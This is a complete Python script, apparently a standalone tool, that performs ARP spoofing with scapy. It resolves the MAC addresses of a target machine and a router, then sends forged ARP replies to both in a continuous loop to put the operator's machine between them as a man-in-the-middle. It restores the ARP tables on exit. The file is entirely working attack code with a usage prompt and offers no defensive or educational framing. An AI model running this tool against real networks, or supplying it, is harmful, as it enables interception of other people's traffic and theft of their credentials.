import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from rich import print
from rich.console import Console
from scapy.all import *
from time import sleep
import sys

def arp_spoof(victim_ip, victim_mac, router_ip, attacker_mac):
    packet = ARP(op='is-at', pdst=victim_ip, hwdst=victim_mac, psrc=router_ip, hwsrc=attacker_mac)
    send(packet, verbose=False)

def arp_restore(victim_ip, victim_mac, source_ip, source_mac):
    arp_spoof(victim_ip, victim_mac, source_ip, source_mac)

def main():
    console = Console()
    try:
        victim_ip = sys.argv[1]
        router_ip = sys.argv[2]
    except IndexError:
        print("Usage:")
        print(f"\tpython3 {sys.argv[0]} <target_ip> <router_ip>")
        sys.exit(1)

    for tries in range(5):
        victim_mac = getmacbyip(victim_ip)
        router_mac = getmacbyip(router_ip)
        if victim_mac is not None and router_mac is not None:
            break
        sleep(1)
    else:
        print("[bold red][-] Failed to get victim mac address![/]")
        sys.exit(1)

    attacker_mac = get_if_hwaddr(conf.iface)

    print(f'[[green bold]+[/]] Victim Mac:        {victim_mac}')
    print(f'[[green bold]+[/]] Router Mac:        {router_mac}')
    print(f'[[green bold]+[/]] Your/Attacker Mac: {attacker_mac}')

    try:
        print()
        with console.status("Sending ARP packets...", spinner="dots12"):
            while True:
                arp_spoof(victim_ip, victim_mac, router_ip, attacker_mac)
                arp_spoof(router_ip, router_mac, victim_ip, attacker_mac)
                sleep(1)
    except KeyboardInterrupt:
        with console.status("Restoring ARP tables...", spinner="dots12"):
            for _ in range(20):
                arp_restore(victim_ip, victim_mac, router_ip, router_mac)
                arp_restore(router_ip, router_mac, victim_ip, victim_mac)
                sleep(0.2)
            sys.exit(0)


if __name__ == '__main__':
    main()
